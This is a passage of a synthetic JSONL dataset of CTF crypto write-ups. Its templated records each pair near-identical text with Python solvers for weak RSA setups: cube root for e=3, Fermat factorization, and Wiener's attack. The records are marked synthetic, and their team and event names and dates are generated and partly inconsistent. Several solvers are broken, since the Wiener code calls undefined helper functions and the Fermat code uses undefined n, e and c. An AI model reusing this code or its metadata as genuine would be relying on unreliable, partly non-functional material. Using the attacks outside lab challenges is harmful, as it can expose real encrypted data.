9920002806265502795480034712274423751679631916522387906548466151113482426050930348009328606250677896338262261062641442455093263419228326819997300873477653879008324315019248868971531966355420804942873736185810056680681123761238965871688025234864939196372110922584756553388392122114051507012465060427945\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/0", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825262", "synthetic": true}
{"id": "synthetic_rsa_001", "team": "synthetic_team_10", "event": "CTF_2024_Event_11", "challenge_name": "RSA Fermat Factorization #2", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/1", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825318", "synthetic": true}
{"id": "synthetic_rsa_002", "team": "synthetic_team_4", "event": "CTF_2024_Event_4", "challenge_name": "RSA Wiener Attack #3", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/2", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825339", "synthetic": true}
{"id": "synthetic_rsa_003", "team": "synthetic_team_2", "event": "CTF_2024_Event_7", "challenge_name": "RSA Fermat Factorization #4", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/3", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825353", "synthetic": true}
{"id": "synthetic_rsa_004", "team": "synthetic_team_10", "event": "CTF_2024_Event_19", "challenge_name": "RSA Wiener Attack #5", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/4", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825372", "synthetic": true}
{"id": "synthetic_rsa_005", "team": "synthetic_team_1", "event": "CTF_2024_Event_3", "challenge_name": "RSA Wiener Attack #6", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/5", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825387", "synthetic": true}
{"id": "synthetic_rsa_006", "team": "synthetic_team_4", "event": "CTF_2024_Event_6", "challenge_name": "RSA Small Exponent Attack #7", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 39553012519198761575159895798629792649032838824947704918992647668228809096145186163656172318047052579046727707952316928814350809310263990882731732489895502842828123835559595520254693152954534221568201542345649948667281417026356376906952214277418771013143267339523534667936531231644476456411321682932974\ne = 3\nc = 18114082440355980421765610617944948821498117945632065218510559379166317742275314841863791755896229485030113035938792565037776035495520694641433791847322458278612065355161753276207121002568446093749035356278257189237719614321618657315449864228270484475679157607213333988856658968129112266159287673169921\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 39553012519198761575159895798629792649032838824947704918992647668228809096145186163656172318047052579046727707952316928814350809310263990882731732489895502842828123835559595520254693152954534221568201542345649948667281417026356376906952214277418771013143267339523534667936531231644476456411321682932974\ne = 3\nc = 18114082440355980421765610617944948821498117945632065218510559379166317742275314841863791755896229485030113035938792565037776035495520694641433791847322458278612065355161753276207121002568446093749035356278257189237719614321618657315449864228270484475679157607213333988856658968129112266159287673169921\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/6", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825413", "synthetic": true}
{"id": "synthetic_rsa_007", "team": "synthetic_team_2", "event": "CTF_2024_Event_10", "challenge_name": "RSA Small Exponent Attack #8", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 7850204994377669822987016746198389905753374193802888633079368918042148498404329718890716956500123624069573443692201112606854903000178631573399816228029024609808910646319800450812975859754316057456888344423133775600855129046385530428471510911395099985930607544591752471479833241285889548471609382351790\ne = 3\nc = 73254044282450602737652893540607857920193620959566718121234190779076182132291892750771843444658277452297013187249935709931865091786287898786354323914199904023699458439727229319626924953637185467086834607512548947120912055708264827701242916957304719119020059765548392133469752148343004501503599692790\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 7850204994377669822987016746198389905753374193802888633079368918042148498404329718890716956500123624069573443692201112606854903000178631573399816228029024609808910646319800450812975859754316057456888344423133775600855129046385530428471510911395099985930607544591752471479833241285889548471609382351790\ne = 3\nc = 73254044282450602737652893540607857920193620959566718121234190779076182132291892750771843444658277452297013187249935709931865091786287898786354323914199904023699458439727229319626924953637185467086834607512548947120912055708264827701242916957304719119020059765548392133469752148343004501503599692790\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/7", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825436", "synthetic": true}
{"id": "synthetic_rsa_008", "team": "synthetic_team_2", "event": "CTF_2024_Event_15", "challenge_name": "RSA Fermat Factorization #9", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/8", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825455", "synthetic": true}
{"id": "synthetic_rsa_009", "team": "synthetic_team_1", "event": "CTF_2024_Event_4", "challenge_name": "RSA Fermat Factorization #10", "challenge_description": "RSA with close prime factors, vulnerable to Fermat factorization", "attack_type": "RSA", "tools_used": ["gmpy2"], "difficulty": "medium", "writeup": "# RSA Fermat Factorization\n\n## Challenge Description\nRSA with close prime factors, vulnerable to Fermat factorization\n\n## Analysis\nThis challenge involves rsa fermat factorization techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\ndef fermat_factorization(n):\n    a = gmpy2.isqrt(n) + 1\n    \n    while True:\n        b_squared = a * a - n\n        b = gmpy2.isqrt(b_squared)\n        \n        if b * b == b_squared:\n            p = a + b\n            q = a - b\n            return p, q\n        a += 1\n\n# Factorize n\np, q = fermat_factorization(n)\nphi = (p - 1) * (q - 1)\nd = gmpy2.invert(e, phi)\nm = pow(c, d, n)\nflag = long_to_bytes(m)\nprint(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/9", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825474", "synthetic": true}
{"id": "synthetic_rsa_010", "team": "synthetic_team_10", "event": "CTF_2024_Event_14", "challenge_name": "RSA Wiener Attack #11", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/10", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825490", "synthetic": true}
{"id": "synthetic_rsa_011", "team": "synthetic_team_9", "event": "CTF_2024_Event_5", "challenge_name": "RSA Wiener Attack #12", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/11", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825512", "synthetic": true}
{"id": "synthetic_rsa_012", "team": "synthetic_team_7", "event": "CTF_2024_Event_20", "challenge_name": "RSA Small Exponent Attack #13", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 12316694176288195209773397681196462618903624459195231691269575944197436558299145817098398313390307235103169629989700712655524687954616527386074935928787980077861523771276788098587381321025459437060259298902905476728195413598276605534696128359179945274661723401242474834392626557575347173500592201966534\ne = 3\nc = 9069560089259752273031167655384791955639603029651910576718927866319729352559714447121989658026693353729752901232727416825616661347406891719402195206246434178925710623574745292702859525212059925903807233521520680082172638555004336526581982590025058235439592527297737901560376632413832885264086836879855\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 12316694176288195209773397681196462618903624459195231691269575944197436558299145817098398313390307235103169629989700712655524687954616527386074935928787980077861523771276788098587381321025459437060259298902905476728195413598276605534696128359179945274661723401242474834392626557575347173500592201966534\ne = 3\nc = 9069560089259752273031167655384791955639603029651910576718927866319729352559714447121989658026693353729752901232727416825616661347406891719402195206246434178925710623574745292702859525212059925903807233521520680082172638555004336526581982590025058235439592527297737901560376632413832885264086836879855\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/12", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825535", "synthetic": true}
{"id": "synthetic_rsa_013", "team": "synthetic_team_6", "event": "CTF_2024_Event_20", "challenge_name": "RSA Small Exponent Attack #14", "challenge_description": "RSA challenge with e=3, vulnerable to cube root attack", "attack_type": "RSA", "tools_used": ["gmpy2", "pycryptodome"], "difficulty": "easy", "writeup": "# RSA Small Exponent Attack\n\n## Challenge Description\nRSA challenge with e=3, vulnerable to cube root attack\n\n## Analysis\nThis challenge involves rsa small exponent attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 30073750214532262738063804540055084380289700332085420278583380375982222112762823499000956712016001495097520149612746081195391041488386888929534543618451001724323435418664488296538401369029755618760410807912614639274805254069803631525760954068315897694772885569096631176287876114846857595069440238460351\ne = 3\nc = 24985179422837371881840048377867402656703412302789506305140083820460076546825208900057549021407143068625296513981821266464174385501889588980364866525291431862107090001288665179679780847085604109042511926930504550714155231412258226084012139186116171712727487680702970671062395105471456234175152099896150\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, pycryptodome\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom Crypto.Util.number import long_to_bytes\n\n# Given values\nn = 30073750214532262738063804540055084380289700332085420278583380375982222112762823499000956712016001495097520149612746081195391041488386888929534543618451001724323435418664488296538401369029755618760410807912614639274805254069803631525760954068315897694772885569096631176287876114846857595069440238460351\ne = 3\nc = 24985179422837371881840048377867402656703412302789506305140083820460076546825208900057549021407143068625296513981821266464174385501889588980364866525291431862107090001288665179679780847085604109042511926930504550714155231412258226084012139186116171712727487680702970671062395105471456234175152099896150\n\n# Cube root attack for small e\nm, exact = gmpy2.iroot(c, 3)\nif exact:\n    flag = long_to_bytes(m)\n    print(flag.decode())\n", "url": "https://synthetic-ctf.example.com/rsa/13", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.825558", "synthetic": true}
{"id": "synthetic_rsa_014", "team": "synthetic_team_1", "event": "CTF_2024_Event_11", "challenge_name": "RSA Wiener Attack #15", "challenge_description": "RSA with small private exponent d, vulnerable to Wiener attack", "attack_type": "RSA", "tools_used": ["gmpy2", "fractions"], "difficulty": "medium", "writeup": "# RSA Wiener Attack\n\n## Challenge Description\nRSA with small private exponent d, vulnerable to Wiener attack\n\n## Analysis\nThis challenge involves rsa wiener attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion of e/n\n    convergents = []\n    cf = continued_fraction(e, n)\n    \n    for i in range(len(cf)):\n        convergent = convergents_from_cf(cf[:i+1])\n        k, d = convergent[-1]\n        \n        if k != 0 and (e * d - 1) % k == 0:\n            phi = (e * d - 1) // k\n            s = n - phi + 1\n            discriminant = s * s - 4 * n\n            \n            if discriminant >= 0:\n                sqrt_discriminant = gmpy2.isqrt(discriminant)\n                if sqrt_discriminant * sqrt_discriminant == discriminant:\n                    return d\n    return None\n\n# Attack implementation\nd = wiener_attack(n, e)\nif d:\n    m = pow(c, d, n)\n    flag = long_to_bytes(m)\n    print(flag.decode())\n\n```\n\n## Tools Used\n- gmpy2, fractions\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport gmpy2\nfrom fractions import Fraction\nfrom Crypto.Util.number import long_to_bytes\n\ndef wiener_attack(n, e):\n    # Continued fraction expansion 